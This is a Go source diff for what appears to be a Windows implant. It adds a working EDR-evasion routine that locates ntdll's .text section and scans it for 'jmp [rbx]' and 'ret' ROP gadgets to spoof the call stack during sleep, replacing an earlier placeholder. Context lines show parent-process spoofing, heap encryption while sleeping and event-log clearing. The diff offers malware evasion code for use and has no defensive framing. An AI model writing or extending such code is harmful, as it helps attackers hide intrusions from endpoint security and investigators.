@@ -127,9 +127,9 @@ func GetSyscallStub(funcName string) (*SyscallStub, error) {
 // (e.g., explorer.exe) instead of the actual implant process.
 func SpawnWithParentSpoof(parentPID uint32, cmdLine string) error {
 	const (
-		EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+		EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
 		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
-		CREATE_NO_WINDOW = 0x08000000
+		CREATE_NO_WINDOW                     = 0x08000000
 	)
 
 	// Open the parent process
@@ -198,22 +198,93 @@ func FindProcessByName(name string) (uint32, error) {
 //  STACK SPOOFING
 // ══════════════════════════════════════════
 
-// SpoofCallStack sets up a fake call stack before sleeping.
-// When EDR scans thread stacks during sleep, the implant's frames
-// will look like they belong to a legitimate Windows API call chain
-// (e.g., NtWaitForSingleObject → RtlUserThreadStart).
-// This is a simplified placeholder — production implementation
-// uses ROP gadgets from ntdll to build a fake stack frame.
+// spoofedNtDelay is implemented in spoof_windows_amd64.s. It pivots the stack and
+// calls NtDelayExecution through a "jmp [rbx]" gadget with a spoofed return
+// address. It must only be called from a native (non-Go) thread.
+func spoofedNtDelay(gadget, sleepFn, retGadget, delay uintptr)
+
+var (
+	spoofJmpRbx uintptr // "jmp [rbx]" (0xFF 0x23) gadget in ntdll
+	spoofRet    uintptr // "ret" (0xC3) instruction in ntdll
+)
+
+// getNtdllBase returns the in-memory base address of ntdll.dll.
+func getNtdllBase() uintptr {
+	k32 := syscall.NewLazyDLL("kernel32.dll")
+	proc := k32.NewProc("GetModuleHandleW")
+	name, err := syscall.UTF16PtrFromString("ntdll.dll")
+	if err != nil {
+		return 0
+	}
+	r, _, _ := proc.Call(uintptr(unsafe.Pointer(name)))
+	return r
+}
+
+// ntdllTextSection returns the .text section bounds (start, size) of a PE module.
+func ntdllTextSection(base uintptr) (uintptr, uint32) {
+	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
+	nt := base + uintptr(eLfanew)
+	numSections := *(*uint16)(unsafe.Pointer(nt + 4 + 2))
+	optSize := *(*uint16)(unsafe.Pointer(nt + 4 + 16))
+	secStart := nt + 4 + 20 + uintptr(optSize)
+	for i := 0; i < int(numSections); i++ {
+		sec := secStart + uintptr(i)*40
+		name := (*[8]byte)(unsafe.Pointer(sec))
+		vsize := *(*uint32)(unsafe.Pointer(sec + 8))
+		vaddr := *(*uint32)(unsafe.Pointer(sec + 12))
+		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
+			return base + uintptr(vaddr), vsize
+		}
+	}
+	return 0, 0
+}
+
+// FindJmpRbxGadget scans ntdll .text for a "jmp [rbx]" (0xFF 0x23) gadget.
+func FindJmpRbxGadget() uintptr {
+	base := getNtdllBase()
+	if base == 0 {
+		return 0
+	}
+	start, size := ntdllTextSection(base)
+	if start == 0 || size == 0 {
+		return 0
+	}
+	for off := uint32(0); off+1 < size; off++ {
+		b := (*[2]byte)(unsafe.Pointer(start + uintptr(off)))
+		if b[0] == 0xFF && b[1] == 0x23 {
+			return start + uintptr(off)
+		}
+	}
+	return 0
+}
+
+// FindRetGadget scans ntdll .text for a "ret" (0xC3) instruction.
+func FindRetGadget() uintptr {
+	base := getNtdllBase()
+	if base == 0 {
+		return 0
+	}
+	start, size := ntdllTextSection(base)
+	if start == 0 || size == 0 {
+		return 0
+	}
+	for off := uint32(0); off < size; off++ {
+		if *(*byte)(unsafe.Pointer(start + uintptr(off))) == 0xC3 {
+			return start + uintptr(off)
+		}
+	}
+	return 0
+}
+
+// SpoofCallStack caches the ROP gadgets used by spoofedNtDelay so the sleep can be
+// performed with a legitimate-looking call stack. Call once at startup.
 func SpoofCallStack() {
-	// In a full implementation:
-	// 1. Save current RSP/RBP
-	// 2. Build fake stack frames pointing to legitimate return addresses
-	//    (e.g., KernelBase!WaitForSingleObjectEx, ntdll!NtWaitForSingleObject)
-	// 3. Set RIP to NtDelayExecution (the legitimate sleep syscall)
-	// 4. On wake, restore the real stack
-	//
-	// This requires assembly stubs and is architecture-specific.
-	// For now, this is a framework that can be extended with ASM.
+	if spoofJmpRbx == 0 {
+		spoofJmpRbx = FindJmpRbxGadget()
+	}
+	if spoofRet == 0 {
+		spoofRet = FindRetGadget()
+	}
 }
 
 // ══════════════════════════════════════════
@@ -275,9 +346,9 @@ type processHeapEntry struct {
 }
 
 const (
-	PROCESS_HEAP_REGION           = 0x0001
+	PROCESS_HEAP_REGION            = 0x0001
 	PROCESS_HEAP_UNCOMMITTED_RANGE = 0x0002
-	PROCESS_HEAP_ENTRY_BUSY       = 0x0004
+	PROCESS_HEAP_ENTRY_BUSY        = 0x0004
 )
 
 // HeapEncryptSleep encrypts all busy heap blocks with a random XOR key,
@@ -367,7 +438,6 @@ func ClearWindowsLogs() []string {
 	}
 	return results
 }
-
 
 // ClearPlatformLogs routes to the Windows event log cleaner.
 func ClearPlatformLogs() []string {
